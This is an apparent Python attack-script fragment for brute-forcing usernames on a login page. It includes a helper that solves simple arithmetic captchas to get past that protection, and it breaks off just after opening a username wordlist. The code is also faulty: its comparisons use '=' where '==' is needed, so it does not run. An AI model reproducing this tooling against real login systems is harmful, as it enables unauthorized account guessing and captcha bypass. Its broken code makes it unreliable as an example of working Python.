import requests
import argparse

def solveCaptcha(captcha):
    if captcha[1] = '+':
        ans=int(captcha[0])+int(captcha[2])
    elif captcha[1] = '-':
        ans=int(captcha[0])-int(captcha[2])
    elif captcha[1] = '*':
        ans=int(captcha[0])*int(captcha[2])
    elif captcha[1] = '/':
        ans=int(captcha[0])/int(captcha[2])
    return ans

def crackUsername(url,captcha):
    print('[+] Starting username brute force ... \n')
    f = open('./username.txt','r')
